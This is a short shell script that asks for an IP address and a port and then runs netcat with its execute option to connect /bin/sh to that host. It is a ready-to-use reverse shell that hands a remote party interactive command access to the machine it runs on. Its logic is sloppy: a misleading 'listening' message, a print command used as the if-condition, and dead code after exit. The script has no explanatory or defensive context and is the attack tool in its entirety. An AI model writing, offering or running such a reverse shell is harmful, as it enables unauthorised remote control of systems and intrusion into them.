#!/bin/sh

clear;

printf "\nEnter IP: \n"
read IP
printf "\nEnter port: \n"
read PORT 
if

clear;

printf "\nlistening to $IP/$PORT ..."

then

netcat -cevv /bin/sh $IP $PORT

else

	exit 1;
	return 0;

fi;
